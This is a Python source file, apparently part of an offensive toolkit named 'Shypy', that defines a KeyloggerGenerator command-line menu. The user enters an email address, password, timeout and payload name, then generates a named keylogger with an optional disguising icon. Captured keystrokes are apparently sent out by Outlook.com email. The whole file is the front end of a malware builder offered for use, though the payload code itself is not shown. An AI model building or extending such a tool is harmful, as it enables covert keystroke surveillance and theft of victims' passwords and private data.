import importlib
from ..utils.module_utils import *
from ..variables.variables import *

class KeyloggerGenerator(ModuleUtils):
    """
    The Generator class is responsible for managing the keylogger generation process.
    It provides a command-line interface for setting up the necessary parameters and
    generating the keylogger.
    """
    def __init__(self) -> None:
        """
        Constructor method for the Generator class.
        Initializes the payload, mail, password, and timeout attributes.
        """

        super().__init__(self)
        self.payload  = ""
        self.mail     = ""
        self.password = ""
        self.time_out = ""
        
    def run(self) -> None:
        """
        Runs the main command-line interface for setting up and generating the keylogger.
        Provides options for setting email, password, timeout, and payload, as well as
        displaying available payloads and generating the keylogger.
        """
        self.clear()
        
        print(f"""{COLOR['CYAN']}
            ╔══════════════════════════════════════════════════════════════════════════╗
            ║*                         - Keylogger Generator -                        *║
            ╠══════════════════════════════════════════════════════════════════════════╣
            ║ IMPORTANT : Outlook.com Should Be Used As The E-mail Address.            ║
            ╠═════════════════════════════════════╦════════════════════════════════════╣ 
            ║              Commands               ║            Function                ║    
            ╠═════════════════════════════════════╬════════════════════════════════════╣   
            ║ "set mail <email>"                  : Set Mail Adress.                   ║ 
            ║ "set password <password>"           : Set Mail Password.                 ║
            ║ "set timeout <time>"                : Set Time Out.                      ║ 
            ║ "set payload" <payload name>        : Set Payload.                       ║ 
            ║ "show payloads"                     : Showing all Payloads.              ║ 
            ║ "generate"                          : Generate a Keylogger.              ║
            ║ "back"                              : Back To Shypy.                     ║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*             E-Mail                 : {COLOR['RESET']}{self.mail}{COLOR['CYAN']}{' ' *  (35 - len(self.mail))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*            Password                : {COLOR['RESET']}{self.password}{COLOR['CYAN']}{' ' *  (35 - len(self.password))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*            Time Out                : {COLOR['RESET']}{self.time_out}{COLOR['CYAN']}{' ' *  (35 - len(self.time_out))}║
            ╠═════════════════════════════════════╬════════════════════════════════════╣
            ║*             Payload                : {COLOR['RESET']}{self.payload}{COLOR['CYAN']}{' ' * (35 - len(self.payload))}║                                             
            ╠═════════════════════════════════════╩════════════════════════════════════╣            
            ║*                               - The Shypy -                            *║ 
            ╚══════════════════════════════════════════════════════════════════════════╝
            \n\n""")

        answer = input(f"{COLOR['CYAN']}Shypy >>{COLOR['RESET']} ").lower().strip()

        if answer.startswith("set mail"):
            try:
                self.mail = answer.split(" ")[2]
                self.run() 
            
            except IndexError:
                self.write(message="set mail <mail>", level=4, delay=1, clear=False)
                self.run()

        elif answer.startswith("set password"):
            try:
                self.password = answer.split(" ")[2]
                self.run()
            
            except IndexError:
                self.write(message="set password <password>", level=4, delay=1, clear=False)
                self.run()

        elif answer.startswith("set timeout"):
            try:
                self.time_out = answer.split(" ")[2]
                self.run()
            
            except IndexError:
                self.write(message="set timeout <delay>", level=4, delay=1, clear=False)
                self.run()
        
        elif answer.startswith("set payload"):
            try:
                self.payload = answer.split(" ")[2]
                self.run()
            
            except IndexError:
                self.write(message="set payload <payload name>", level=4, delay=1, clear=False)
                self.run()
        
        elif answer == "show payloads":
            self.list_payloads("keylogger")

        elif answer == "generate":
            if self.payload == "":
                self.write(message="Please Select a Payload.", level=4, delay=1, clear=False)
                self.run()
            
            else:
                keylogger_name = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Name Of Keylogger: ") + ".py"
                keylogger_icon = input(f"{COLOR['GREEN']}[+]{COLOR['RESET']} The Icon Of Keylogger (Optional): ")
                
                self.pipeline(
                    module="keylogger", payload=self.payload, mail=self.mail, password=self.password, 
                    timeout=int(self.time_out), name=keylogger_name, icon_path=keylogger_icon)
                
                sys.exit(1)
            
        elif answer == "back":
            importlib.import_module("main").Shypy().menu()

        else:
            self.write(message="Invalid Option", level=4, delay=1, clear=False)
            self.run()